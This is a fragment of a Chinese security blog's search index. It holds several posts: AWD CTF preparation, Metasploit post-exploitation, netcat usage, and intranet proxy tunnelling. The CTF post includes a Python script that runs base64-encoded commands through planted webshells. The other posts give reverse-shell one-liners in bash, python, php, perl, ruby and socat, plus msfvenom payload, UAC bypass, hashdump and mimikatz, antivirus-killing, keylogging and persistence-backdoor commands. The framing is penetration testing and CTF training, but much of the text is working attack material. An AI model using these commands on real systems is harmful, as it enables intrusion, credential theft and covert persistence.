安装可用的二进制文件","link":"/2019/06/20/Android/Android%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6Drozer-%E5%9F%BA%E7%A1%80%E7%AF%87/"},{"title":"CTF线下AWD流程和准备工作","text":"0x00 AWD AWD：Attack With Defence，比赛中每个队伍维护多台服务器，服务器中存在多个漏洞，利用漏洞攻击其他队伍可以进行得分，修复漏洞可以避免被其他队伍攻击失分。 一般分配Web服务器，服务器（多数为Linux）某处存在flag（一般在根目录下）； 可能会提供一台流量分析虚拟机，可以下载流量文件进行数据分析； flag在主办方的设定下每隔一定时间刷新一轮； 各队一般都有自己的初始分数； flag一旦被其他队伍拿走，该队扣除一定积分； 扣除的积分由获取flag的队伍均分； 主办方会对每个队伍的服务进行check，服务宕机扣除本轮flag分数，扣除的分值由服务check正常的队伍均分； 一般每个队伍会给一个低权限用户，非root权限； 你需要在一场比赛里要扮演攻击方和防守方，攻者得分，失守者会被扣分。也就是说，攻击别人的靶机可以获取 Flag 分数时，别人会被扣分，同时你也要保护自己的主机不被别人得分，以防扣分。 0x02 赛前准备123451. 各种软件包，如 Python、CURL 等等，以备机器上没有而陷入尴尬 2. 一大堆 EXP 库和漏洞库，可以放个乌云的虚拟机备用3. 加固、基线检查脚本4. WAF 代码和部署脚本5. AWD 专用的批量拿 Webshell、批量交 flag、批量维持权限的基本代码或小框架 比赛前可以准备一个脚本集，集成到一个框架中，这样打AWD会很流畅 0x03 人员分工线下赛一般3人左右，2人攻击，1人防御，发现的漏洞可以攻击其他队伍，也要进行修复，所以攻防相辅相成，以攻为守。 比赛中每个队伍可能会维护多个靶机，web、二进制等，也可以每人负责一台，各自负责攻击和防御。 0x04 防守流程1.修改ssh密码官方在给出服务器密码时，很有可能是默认的，这个时候需要比较手速了，需要赶快修改自己的密码并尝试能不能登录别人的靶机，还有很多时候会只给出一个ip需要尽快做端口的爆破以及修改 2.备份网站源码和数据库。一、防止自己修改网站源码或数据库后无法恢复 二、防止对手入侵主机删除源码服务无法正常运行 ps: 比赛会check服务是否正常，不正常会进行扣分 1.备份网站源码（1） 使用xftp，filezilla client，xshell等工具 将源码备份下来 （2）使用scp命令 1scp -r -P Port remote_username@remote_ip:remote_folder local_file 2.备份数据库（1）备份 1mysqldump -h127.0.0.1 -uroot -ppass database &gt; d:/backupfile.sql （2）还原 12cd /var/lib/mysql //切换mmysql库目录mysql -uroot -ppass database&lt;backupfile.sql 3.检查系统安全性关闭无需开放的端口、检查端口以及服务弱口令，mysql默认密码等，是否做了ssh登录限制，这里建议使用脚本统一完成 4.拿到源码之后使用D盾查杀拿到源码后进行D盾查杀检测预留后门这是送分题，同时可以利用这个漏洞迅速发起攻击，或用此一直维持权限 5.修改权限比如mysql用户读表权限，上传目录是否可执行的权限等 6.部署WAF用自己提前准备好的WAF，使用给脚本进行快速部署，但是需要验证部署后服务是否宕机，需要注意，比赛很容易被check down。 a)在所需要在php文件前加入 1require_once('waf.php'); 如果想要整站防护，就在网站的一个公用文件中，如数据库链接文件config.inc.php中！ 添加require_once(‘waf.php’);来调用本代码 常用php系统添加文件 123456PHPCMS V9 \\phpcms\\base.phpPHPWIND8.7 \\data\\sql_config.phpDEDECMS5.7 \\data\\common.inc.phpDiscuzX2 \\config\\config_global.phpWordpress \\wp-config.phpMetinfo \\include\\head.php b)在每个文件中加入代码 在php.ini中找到 12Automatically add files before or after any PHP document.auto_prepend_file = 360_safe3.php路径; 7.部署文件监控脚本控可读写权限的目录是否新增、删除文件并及时提醒。这里说下，如果被种了不死马的话通常有以下几种克制方法： 1234强行 kill 掉进程后重启服务建立一个和不死马相同名字的文件或者目录写脚本不断删除文件不断写入一个和不死马同名的文件 监测脚本如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;?php error_reporting(0); define('LOG_FILEDIR','./logs'); function waf() { if (!function_exists('getallheaders')) { function getallheaders() { foreach ($_SERVER as $name =&gt; $value) { if (substr($name, 0, 5) == 'HTTP_') $headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5)))))] = $value; } return $headers; } } $get = $_GET; $post = $_POST; $cookie = $_COOKIE; $header = getallheaders(); $files = $_FILES; $ip = $_SERVER[&quot;REMOTE_ADDR&quot;]; $method = $_SERVER['REQUEST_METHOD']; $filepath = $_SERVER[&quot;SCRIPT_NAME&quot;]; foreach ($_FILES as $key =&gt; $value) { $files[$key]['content'] = file_get_contents($_FILES[$key]['tmp_name']); file_put_contents($_FILES[$key]['tmp_name'], &quot;virink&quot;); } unset($header['Accept']);$input = array(&quot;Get&quot;=&gt;$get, &quot;Post&quot;=&gt;$post, &quot;Cookie&quot;=&gt;$cookie, &quot;File&quot;=&gt;$files, &quot;Header&quot;=&gt;$header); logging($input); } function logging($var){ $filename = $_SERVER['REMOTE_ADDR'];$LOG_FILENAME = LOG_FILEDIR.&quot;/&quot;.$filename;$time = date(&quot;Y-m-d G:i:s&quot;);file_put_contents($LOG_FILENAME, &quot;\\r\\n&quot;.$time.&quot;\\r\\n&quot;.print_r($var, true), FILE_APPEND); file_put_contents($LOG_FILENAME,&quot;\\r\\n&quot;.'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING'], FILE_APPEND);file_put_contents($LOG_FILENAME,&quot;\\r\\n***************************************************************&quot;,FILE_APPEND);} waf(); ?&gt; 8.部署流量监控脚本或开启服务器日志记录。目的主要是为了进行流量回放，看其它大佬如何用我们没发现的漏洞来打我们的机子，抓取到之后把看不懂的流量直接回放到别的机子去，这里还得提到，我们自己在攻击的时候，也要试着混淆一下自己的攻击流量，不能轻易被别人利用。 在比赛机器上使用tcpdump进行流量抓取 1tcpdump -s 0 -w flow.pcap port 9999 9.时刻关注流量和积分榜时刻看着自己的分数，看到自己被down了就赶紧恢复，不管被删库还是被自己删了什么重要配置文件或者还是上的通用waf脚本过不了check。 0x05 攻击流程1.预留后门及弱口令即使发现预留后门以及弱口令可以上传一些反弹shell内php 用nc连接一直拿分 2.信息收集、探测端口、探测端口服务端口攻击这是时候需要体现手速和相应的脚本可以使用自己收集或者熟悉的比如，nmap，msf啥的方便进行后渗透 3.web框架漏洞web大多数为php 也有java、python等，一种是已有漏洞的框架一种是出题人自己写的框架，需要在电脑中备好EXP库，漏洞库、扫描库以及相应的提权辅助脚本 4.源代码进行代码审计D盾查杀反馈防守队友，Seay等源码审计工具（报错率也是极高的），发现问题迅速验证，并报给防守队友，编写攻击脚本 5.维持权限对拿到webshell的点要维持权限，在AWD中优先考虑种不死马、反弹shell等工具 6.编写脚本批量拿分123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106#!/usr/bin/python#coding=utf-8import sys,requests,base64 def loadfile(filepath): try : file = open(filepath,&quot;rb&quot;) return str(file.read()) except : print &quot;File %s Not Found!&quot; %filepath sys.exit() def file_write(filepath,filecontent): file = open(filepath,&quot;a&quot;) file.write(filecontent) file.close() def getflag(url,method,passwd,flag_path): #flag机的url flag_url=&quot;192.168.45.1&quot; #print url #判断shell是否存在 try : res = requests.get(url,timeout=3) except : print &quot;[-] %s ERR_CONNECTION_TIMED_OUT&quot; %url file_write(flag_path,&quot;[-] %s ERR_CONNECTION_TIMED_OUT\\n\\n&quot; %url) return 0 if res.status_code!=200 : print &quot;[-] %s Page Not Found!&quot; %url file_write(flag_path,&quot;[-] %s Page Not Found!\\n\\n&quot; %url) return 0 #执行命令来获取flag system,exec,passthru,`,shell_exec #a=@eval(base64_decode($_GET[z0]));&amp;z0=c3lzdGVtKCJ3aG9hbWkiKTs= cmd = &quot;curl &quot;+flag_url #cmd = &quot;whoami&quot; getflag_cmd =&quot;echo system(\\&quot;%s\\&quot;);&quot;%cmd data={} if method=='get': data[passwd]='@eval(base64_decode($_GET[z0]));' data['z0']=base64.b64encode(getflag_cmd) try: res = requests.get(url,params=data,timeout=3) #print res.url if res.content: content = url+&quot;\\n&quot;+res.content+&quot;\\n\\n&quot; file_write(flag_path,content) print &quot;[+] %s getflag sucessed!&quot;%url else : print &quot;[-] %s cmd exec response is null!&quot;%url content = url+&quot;\\ncmd exec response is null!\\n\\n&quot; file_write(flag_path,content) except : file_write(flag_path,&quot;\\n[+] %s Getflag Failed! You can check the shell's passwd!\\n\\n&quot;%url) print &quot;[+] %s Getflag Failed! You can check the shell's passwd!&quot;%url elif method=='post': data['pass']='Sn3rtf4ck' data[passwd]='@eval(base64_decode($_POST[z0]));' data['z0']=base64.b64encode(getflag_cmd) try: res = requests.post(url,data=data,timeout=3) if res.content: content = url+&quot;\\n&quot;+res.content+&quot;\\n\\n&quot; file_write(flag_path,content) print &quot;[+] %s getflag sucessed!&quot;%url else : print &quot;[-] %s cmd exec response is null!&quot;%url content = url+&quot;\\ncmd exec response is null!\\n\\n&quot; file_write(flag_path,content) except: file_write(flag_path,&quot;\\n[+] %s Getflag Failed! You can check the shell's passwd!\\n\\n&quot;%url) print &quot;[+] %s Getflag Failed! You can check the shell's passwd!&quot;%url if __name__ == '__main__': #存放flag的文件 flag_path=&quot;./flag.txt&quot; shellstr=loadfile(&quot;./webshell.txt&quot;) list = shellstr.split(&quot;\\r\\n&quot;) #print str(list) i = 0 url={} passwd={} method={} for data in list: if data: ls = data.split(&quot;,&quot;) method_tmp = str(ls[1]) method_tmp = method_tmp.lower() if method_tmp=='post' or method_tmp=='get': url[i]=str(ls[0]) method[i]=method_tmp passwd[i]=str(ls[2]) i+=1 else : print &quot;[-] %s request method error!&quot; %(str(ls[0])) file_write(flag_path,&quot;[-] %s request method error!\\n\\n&quot; %(str(ls[0]))) else : pass #print str(len(url)) for j in range(len(url)): #调用执行命令的模块 #print str(j) #print &quot;url is %s method is %s passwd is %s&quot; %(url[j],method[j],passwd[j]) getflag(url=url[j],method=method[j],passwd=passwd[j],flag_path=flag_path) print &quot;Getflag finished!&quot; 0x06 资源分享Github资源： 1234567891011AWD攻防赛脚本集合: &lt;https://github.com/admintony/Prepare-for-AWD&gt; Attack-Defense-Framework: &lt;https://github.com/SniperOJ/Attack-Defense-Framework/tree/v2&gt; AWD攻防赛webshell批量利用框架: &lt;https://github.com/Ares-X/AWD-Predator-Framework&gt; awd-frame: &lt;https://github.com/xnianq/awd-frame&gt; WEB-AWD-Framework:&lt;https://github.com/dahua966/WEB-AWD-Framework&gt; AWD-helper: &lt;https://github.com/sarleon/AWD-helper&gt; AWD经验： 12345678910111213141516-聊聊AWD攻防赛流程及准备经验：&lt;https://www.freebuf.com/articles/network/201222.html&gt;- CTF线下赛AWD模式下的生存技巧: &lt;https://www.anquanke.com/post/id/84675&gt;- CTF线下赛AWD套路小结: &lt;https://xz.aliyun.com/t/25&gt;- AWD混战攻略: &lt;https://www.jianshu.com/p/d21b7e1bffaf&gt;- CTF线下AWD攻防模式的准备工作及起手式: &lt;https://blog.csdn.net/like98k/article/details/80261603&gt;- 2017强网杯线下AWD攻防总结（适合新手）: &lt;https://www.t00ls.net/articles-42278.html&gt;- AWD攻防线下生存之道: [http://47.95.201.153/blog/AWD攻防线下生存之道.html](http://47.95.201.153/blog/AWD%E6%94%BB%E9%98%B2%E7%BA%BF%E4%B8%8B%E7%94%9F%E5%AD%98%E4%B9%8B%E9%81%93.html)- CTF AWD模式攻防Note: &lt;https://www.cnblogs.com/nul1/p/9576386.html&gt; 权限维持： 123456789- 不死马的删除: &lt;https://yq.aliyun.com/zt/325638&gt;- awd攻防之kill不死马: &lt;https://www.jianshu.com/p/ba79686987da&gt;- python中的后渗透|也可用于AWD攻防–shell管理: &lt;https://www.jianshu.com/p/2e8e7330b73e&gt;- 从0到1掌握AWD攻防之RSA必杀: &lt;https://www.360zhijia.com/anquan/456324.html&gt;- 资深大牛教你如何web端权限维持（内附具体步骤）: [http://www.sohu.com/a/127074604\\_472906](http://www.sohu.com/a/127074604_472906)","link":"/2019/06/21/CTF/CTF%E7%BA%BF%E4%B8%8BAWD%E6%B5%81%E7%A8%8B%E5%92%8C%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C/"},{"title":"MSF进行后渗透测试","text":"MSF进行后渗透测试 ​ 在对目标进行渗透测试的时候，通常情况下，我们首先获得的是一台web服务器的webshell或者反弹shell，如果权限比较低，则需要进行权限提升；后续需要对系统进行全面的分析，搞清楚系统的用途；如果目标处于一个内网环境中，那么我们就需要通过它对内网的其它终端进行信息收集和渗透测试，更全面地挖掘系统中存在的安全隐患。 一、获取Meterpreter会话 1.直接获取 （1）使用msfvenom生成payload 常用命令： msfvenom -p /windows/x64/meterperter_reverse_tcp lhost=本地ip lport=本地监听端口 -f exe -o ./re.exe （2）本地监听 监听需要用到msf的exploit/multi/handler模块，使用show options查看需要设置的参数。重要的参数有三个：监听使用的payload、本地ip、本地监听端口。这些参数的值跟之前msfvenom使用的参数一样。 ​ （3）获得回话 将生成的exe文件或者其它类型的payload文件在目标上执行，就可以获得一个meterpreter会话，之后就可以使用msf开展后渗透测试的相关工作。 ​ 2.cmdshell升级为meterpreter 如果最开始获取的是cmdshell，后来发现这台机器非常适合作为测试其它终端的跳板，这个时候cmdshell的功能已经不能满足需要，升级成meterpreter就十分有必要。 (1)以ms17-010的利用为例，默认使用的payload返回的就是cmdshell ​ (2)将该cmdshell升级成meterpreter 命令：sessions-ucmdshell的id ​ ​ (3)查看是否升级成功 ​ 二、提权 通常webshell的权限都比较低，能够执行的操作有限，没法查看重要文件、修改系统信息、抓取管理员密码和hash、安装特殊程序等，所以我们需要获取系统更高的权限。 1.绕过UAC 用户帐户控制（UAC）是微软在 Windows Vista 以后版本引入的一种安全机制，有助于防止对系统进行未经授权的更改。应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员专门给系统授予管理员级别的访问权限。UAC 可以阻止未经授权的应用程序进行自动安装，并防止无意中更改系统设置。 msf提供了如下几个模块帮助绕过UAC： ​ 以exploit/windows/local/bypassuac_eventvwr为例，其它模块的使用方法基本一致。 (1)首先需要在meterpreter下执行background命令让当前会话保存到后台。 ​ (2)使用sessions命令可以查看所有后台的会话，每个session对应一个id值，后面会经常用到。 ​ (3)使用use exploit/windows/local/bypassuac_eventvwr命令进入该模块，使用show options查看需要设置的参数。 ​ (4)将参数session设置为1，直接运行exploit或者run命令，执行成功之后会返回一个新的meterpreter会话。 ​ (5)使用getuid命令查看当前用户，此时仍然是普通用户，再使用getsystem命令就可以提升到system权限了。 ​ 2.利用系统漏洞提权 无论是linux还是windows都出过很多高危的漏洞，我们可以利用它们进行权限提升，比如windows系统的ms13-081、ms15-051、ms16-032、ms17-010等，msf也集成了这些漏洞的利用模块。 (1)使用search 补丁号进行搜索，就可以找到相关模块，以ms13-081为例。 ​ (2)使用use exploit/windows/local/ms13_081_track_popup_menu命令进入该模块，使用show options命令查看需要设置的参数。 ​ (3)使用set session 1命令设置后台的meterpreter会话id，再使用run命令运行，获取的就是SYSTEM权限。 ​ 三、进程迁移 当meterpreter单独作为一个进程运行时容易被发现，如果将它和系统经常运行的进程进行绑定，就能够实现持久化。 1.查看当前会话的进程id 命令：**getpid** ​ 2.查看目标运行的进程 命令：**ps** ​ 3.绑定进程 命令：**migrate pid** ​ 四、令牌假冒 在用户登录windows操作系统时，系统都会给用户分配一个令牌(Token)，当用户访问系统资源时都会使用这个令牌进行身份验证，功能类似于网站的session或者cookie。 msf提供了一个功能模块可以让我们假冒别人的令牌，实现身份切换，如果目标环境是域环境，刚好域管理员登录过我们已经有权限的终端，那么就可以假冒成域管理员的角色。 1.查看当前用户 ​ 2.使用use incognito命令进入该模块 命令：**use incognito** ​ 3.查看存在的令牌 命令：**list_tokens-u** ​ 4.令牌假冒 命令：**impersonate_token 用户名** 注意用户名的斜杠需要写两个。 ​ 5.查看是否成功切换身份 ​ 五、获取凭证 在内网环境中，一个管理员可能管理多台服务器，他使用的密码有可能相同或者有规律，如果能够得到密码或者hash，再尝试登录内网其它服务器，可能取得意想不到的效果。 1.使用meterpreter的run hashdump命令。 ​ ​ 2.使用load mimikatz加载mimikatz模块，再使用help mimikatz查看支持的命令。 ​ 3.使用wdigest命令获取登录过的用户储存在内存里的明文密码。 ​ 六、操作文件系统 1.文件的基本操作 ls：列出当前路径下的所有文件和文件夹。 pwd 或 getwd：查看当前路径。 search：搜索文件，使用search -h查看帮助。 cat：查看文件内容，比如cat test.txt。 edit：编辑或者创建文件。和Linux系统的vm命令类似，同样适用于目标系统是windows的情况。 rm：删除文件。 cd：切换路径。 mkdir：创建文件夹。 rmdir：删除文件夹。 getlwd 或 lpwd：查看自己系统的当前路径。 lcd：切换自己当前系统的目录。 lls：显示自己当前系统的所有文件和文件夹。 2.文件的上传和下载 (1) upload 格式：**upload本地文件路径目标文件路径** ​ (2)download 格式：**download 目标文件路径 本地文件路径** ​ 七、系统其它操作 1.关闭防病毒软件 run killav run post/windows/manage/killav 2.操作远程桌面 run post/windows/manage/enable_rdp开启远程桌面 ​ run post/windows/manage/enable_rdp username=test password=test添加远程桌面的用户(同时也会将该用户添加到管理员组) ​ 3.截屏 screenshot 4.键盘记录 keyscan_start：开启键盘记录功能 keyscan_dump：显示捕捉到的键盘记录信息 keyscan_stop：停止键盘记录功能 ​ 5.执行程序 execute -h 查看使用方法 -H：创建一个隐藏进程 -a：传递给命令的参数 -i：跟进程进行交互 -m：从内存中执行 -t：使用当前伪造的线程令牌运行进程 -s：在给定会话中执行进程 例：**execute -f c:/temp/hello.exe** ​ 八、端口转发和内网代理 1.portfwd portfwd是meterpreter提供的端口转发功能，在meterpreter下使用portfwd -h命令查看该命令的参数。 ​ 常用参数： -l：本地监听端口 -r：内网目标的ip -p：内网目标的端口 ​ 上面命令执行之后，会将10.1.1.3的3389端口转发到本地的2222端口。 ​ 2.pivot pivot是msf最常用的代理，可以让我们使用msf提供的扫描模块对内网进行探测。 (1)首先需要在msf的操作界面下添加一个路由表。 添加命令：route add 内网ip 子网掩码 session的id 打印命令：**route print** ​ 路由添加成功之后就可以在msf里访问10.1.1.0/24这个网段。 (2)建立socks代理。 如果其它程序需要访问这个内网环境，就可以建立socks代理。 msf提供了3个模块用来做socks代理。 auxiliary/server/socks4a use auxiliary/server/socks5 use auxiliary/server/socks_unc 以auxiliary/server/socks4a为例，查看需要设置的参数。 ​ 一共两个参数： SRVHOST：监听的ip地址，默认为0.0.0.0，一般不需要更改。 SRVPORT：监听的端口，默认为1080。 直接运行run命令，就可以成功创建一个socks4代理隧道，在linux上可以配置**proxychains使用，在windows可以配置Proxifier**进行使用。 九、后门 Meterpreter的shell运行在内存中，目标重启就会失效，如果管理员给系统打上补丁，那么就没办法再次使用exploit获取权限，所以需要持久的后门对目标进行控制。 Msf提供了两种后门，一种是metsvc(通过服务启动)，一种是persistence(支持多种方式启动)。 1.metsvc (1) 使用run metsvc -h查看帮助，一共有三个参数。 -A：安装后门后，自动启动exploit/multi/handler模块连接后门 -h：查看帮助 -r：删除后门 (2) 安装后门 命令：**run metsvc** ​ 命令运行成功后会在C:WindowsTEMP目录下新建随机名称的文件夹，里面生成3个文件（metsvc.dll、metsvc-server.exe、metsvc.exe）。 ​ 同时会新建一个服务，显示名称为Meterpreter，服务名称为metsvc，启动类型为”自动”,绑定在31337端口。 ​ (3) 连接后门 使用exploit/multi/handler模块，payload设置为windows/metsvc_bind_tcp，设置目标ip和绑定端口31337。 ​ 2.persistence (1) 使用run persistence -h查看参数。 -A：安装后门后，自动启动exploit/multi/handler模块连接后门 -L：自启动脚本的路径，默认为%TEMP% -P：需要使用的payload，默认为windows/meterpreter/reverse_tcp -S：作为一个服务在系统启动时运行（需要SYSTEM权限） -T：要使用的备用可执行模板 -U：用户登陆时运行 -X：系统启动时运行 -i：后门每隔多少秒尝试连接服务端 -p：服务端监听的端口 -r：服务端ip (2) 生成后门 命令：**run persistence -X -i 10 -r 192.168.1.9 -p 4444** ​ (3) 连接后门 使用exploit/multi/handler模块，payload设置为windows/meterpreter/reverse_tcp，同时设置好服务端监听ip和端口。 ​","link":"/2018/12/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/MSF%E8%BF%9B%E8%A1%8C%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"title":"nc使用详解","text":"NC概述: nc又名netcat，一个简单而有用的工具，可以干很多事情，但是不可以吃。 何为反弹shell？为什么不反弹攻击?相信你有一天可以直接把所有攻击反弹回去的. 常用命令 banner获取 1nc -nv ip port 连接远程主机 1nc -nvv ip port 端口扫描 12nc -v ip port //指定端口nc -v -z ip 1-1555 //指定端口段 文件传输 12nc -lvp 8888 &lt; test.txt 服务端nc -nv 服务端ip 8888 &gt; test.txt 客户端 获取shell正向shell：客户端想要获取服务器shell 12345 客户端监听nc -lvp 8888 -e /bin/sh nc -lvp 8888 -e c:\\windows\\system32\\cmd.exe 服务端反弹 nc 服务端ip 8888 反向shell：服务端想要获取客户端器shell 12345客户端监听nc -lvp 8888 服务端反弹nc ip 8888 -e /bin/sh nc ip 8888 -e c:\\windows\\system32\\cmd.exe 没有nc是，由于各种环境不同，可以结合天时地利人和。 Bash 1234bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1base64版 bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEzNy4xMzUvNzg5MCAwPiYx|{base64,-d}|{bash,-i}'123 python 12python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ip',port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);&quot;1 php 12php -r '$sock=fsockopen(&quot;ip&quot;,port);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'1 perl 12Socket;$i=&quot;ip&quot;;$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'1 ruby 12ruby -rsocket -e'f=TCPSocket.open(&quot;ip&quot;,port).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)'1 nc反弹nc 1nc -e /bin/bash ip port Netcat 1rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip port &gt;/tmp/f Telnet 1TF=$(mktemp -u); mkfifo $TF &amp;&amp; telnet ip port 0&lt;$TF | /bin/sh 1&gt;$TF socat 1socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:106.xxx.xxx.115:9999","link":"/2020/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/nc%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/"},{"title":"代理转发","text":"概念代理转发就是将一个端口，端口可以为主机端口也可以是访问到的人以主机的端口，转发到任意一台可以访问到的IP上 区分正向连接和反向连接 正向连接：你的机器连接目标机器 反向连接：目标机器反连你的机器（当防火墙设置端口过滤的话使用） 不论映射，还是转发，都有正有反，原理相同 工具使用NCnc的正向连接： 在公网服务器上监听他的cmd.exe 命令为：nc.exe -l -p 4444 -e cmd.exe 在攻击者上监听nc -vv 公网服务器ip 4444 可以获取到公网服务器的cmd nc的反向代理： 在公网服务器上监听自己的4444端口：nc.exe -lvp 4444 在内网主机中进行：nc -t -e cmd.exe 公网ip 4444 公网可成功获取内网cmd LCXLCX的内网端口转发（防火墙做过滤不允许别人连接自己的3389） 内网执行lcx.exe -slave 公网ip 4444 127.0.0.1 3389 内网将自己的3389端口转发到公网的4444端口 公网主机监听自己端口 lcx.exe -listen 4444 5555 则攻击者连接公网ip的5555端口即可连接上内网的3389 LCX的本地端口转发（防火墙做过滤不允许自己的3389连接出去） 防火墙限制，部分端口无法通过防火墙，可以将目标主机的3389端口传到允许的其他端口比如53，则在目标主机执行：lcx -tran 53 目标主机ip 3389 可以直接连接目标主机的ip:53 ew做代理①首先在VPS上做相应的代理监听： ./ew_for_Linux32 -s rcsocks -l 1008 -e 888 在VPS上 监听888端口 并加端口转发给 本地的 1008端口 ​ ② 在客户端(内网环境)连接VPS的888端口 ew_for_Win.exe -s rssocks -d 104.224.150.102 -e 888 ​ 🌂利用相应的代理软件 来监听 VPS的1008端口既可以进行内网穿透式连接 ​ 利用frp做代理download：https://github.com/fatedier/frp/releases ①首先在VPS上做如下配置： 修改 frps.ini bind_port = 8080 privilege_token = pentest999 运行 nohup ./frps -c frps.ini &amp; ​ ②在客户端上做如下配置： 修改 frpc.ini [common] server_addr = vps ip server_port = 8080 privilege_token = pentest999 [plugin_socks5] type = tcp remote_port = 8081 plugin = socks5 plugin_user = ptest33333 plugin_passwd = ptest66666 运行 frpc -c fprc.ini 🌂利用相应的socks5代理连接 VPS的 8081端口即可 ssh 隧道代理转发ssh 有三个强大的端口转发命令，分别是本地转发、远程转发、动态转发。 本地访问127.0.0.1:port1就是host:port2(用的更多)ssh -CfNg -L port1:127.0.0.1:port2 user@host #本地转发访问host:port2就是访问127.0.0.1:port1ssh -CfNg -R port2:127.0.0.1:port1 user@host #远程转发可以将dmz_host的hostport端口通过remote_ip转发到本地的port端口ssh -qTfnN -L port:dmz_host:hostport -l user remote_ip #正向隧道 监听本地port 可以将dmz_host的hostport端口转发到remote_ip的port端口ssh -qTfnN -R port:dmz_host:hostport -l user remote_ip #反向隧道用于内网穿透防火墙限制之类socket 代理: ssh -qTfnN -D port remotehost 毒刺Stinger进行端口转发端口转发 将stinger_server和proxy.php上传到目标服务器,确保 http://192.168.1.106:81/proxy.php可以访问,页面返回 stinger XXX! 目标服务器执行如下命令启动代理服务(使用菜刀执行命令时可以添加start /b 或&amp; 后台运行,确保服务端7000端口未被占用) PS C:\\Users\\test\\Desktop&gt; .\\stinger_server_win_x64.exe -listen 127.0.0.1:7000 -username test -password testpass 本地PC执行如下命令连接代理脚本 stinger_client_win_x64.exe -local 127.0.0.1:1080 -proxy_server http://192.168.1.106:81/proxy.php -remote_server http://127.0.0.1:7000 -remote 127.0.0.1:3389 -username test -password testpass 此时已经将192.168.1.106的3389端口映射到了你本地pc的1080端口 SOCK5代理 将stinger_server和proxy.php上传到目标服务器,确保 http://192.168.1.106:81/proxy.php可以访问,页面返回 stinger XXX! 目标服务器执行如下命令启动代理服务(使用菜刀执行命令时可以添加start /b 或&amp; 后台运行,确保服务端7000,8000端口未被占用) PS C:\\Users\\test\\Desktop&gt; .\\stinger_server_win_x64.exe -listen 127.0.0.1:7000 -username test -password testpass -socks5Addr 127.0.0.1:8000 本地PC执行如下命令连接代理脚本 stinger_client_win_x64.exe -local 127.0.0.1:1080 -proxy_server http://192.168.1.106:81/proxy.php -remote_server http://127.0.0.1:7000 -remote 127.0.0.1:8000 -username test -password testpass 此时你本地PC已经在1080生成一个SOCKS5代理,可以使用该代理访问目标内网 已测试 stinger_server\\stinger_client windows linux proxy.jsp/php/aspx php7.2 tomcat7.0 iis8.0 已知问题 client端的socket连接无法自动释放 结语 php是最好的语言 啊D是最好的渗透测试工具 reGeorg端口转发reGeorg不用多介绍了，内网渗透中常用工具之一。小白经常用于渗透测试中的内网转发，主要是因为方便实用。这个工具需要配合 proxifier,使用的socks5代理进行运用的。标红的是我们需要的脚本，根据自己的需要结合实际测试环境来选用的。 首先我们现经代理脚本上传到服务器，实验的环境是jsp的，所以上传代理脚本tunnel.nosocket.jsp，然后我们在浏览器访问一下，如果出现以下提示就说明代理成功。 上传代理脚本成功后，我们打开proxifier进行配置参数，代理的端口默认是8888，代理的规则我们设置为谷歌浏览器，如果其它的不需要可以去掉勾： 上述代理参数配置完毕后，我们在cmd输入一下命令就会出现下面的界面:python2.exe reGeorgSocksProxy.py -p 8888 -uhttp://xxxx:8888/tran.jsp。这样的话我们就把内网的流量代理到外面，我们下一步就可以使用扫描工具进行内网的横向扫描。就这么简单直接。如果内网中的3389只能是内网进行连接的话，我们可以使用mstsc.exe通过代理进行连接3389远程桌面，其它的端口都是一样的道理，灵活运用即可。 Tunna端口转发Tunna这个工具使用起来也特方便，脚本的编写也是基于Python2版本。运用的时候也需要我们把代理脚本上传到目标服务器，然后通过代理内网的某个端口，注意这个工具只能代理一个端口，有点局限性。但是我们可以代理3389、22、3306、1433等敏感端口，然后将敏感端口流量转发了外网的的某个端口，我们再通过本地连接外网的端口进行连接，这样的话我们就可以使用了。 第一步：我们将代理脚本上传到目标服务器，在浏览器访问代理脚本是否被解析 第二步：运行proxy.py 并指定端口 python proxy.py -uhttp://192.168.205.143/conn.php -l 1234 -r 3389 -v 第三步：本地执行rdesktop 127.0.0.1:1234 reDuh端口转发reDuh也是一款内网渗透利器，这个工具可以把内网服务器的端口通过http/https隧道转发到本机，形成一个连通回路。用于目标服务器在内网或做了端口策略的情况下连接目标服务器内部开放端口。服务端是个webshell，工具里面针对不同服务器有aspx,php,jsp三个版本，客户端是java写的，本机执行最好装上JDK软件。 我们将代理脚本上传到目标服务器，在本地访问代理脚本 这样我们执行一下三条命令就可以成功将目标主机的3389端口代理到本地的1234端口，本地连接1234端口就可以登陆内网服务器。 java -jar reDuhClient.ja rhttp://somesite.com/reDuh.php 本地连接1010端口 nc -vv localhost 1010 连接成功会有欢迎提示，之后输入命,在java命令窗口执行 [createTunnel]1234:127.0.0.1:3389 基于powershell的socks代理介绍github： 1https://raw.githubusercontent.com/p3nt4/Invoke-SocksProxy/master/Invoke-SocksProxy.psm1 在1234端口创建一个Socks 4/5 代理: 123Import-Module 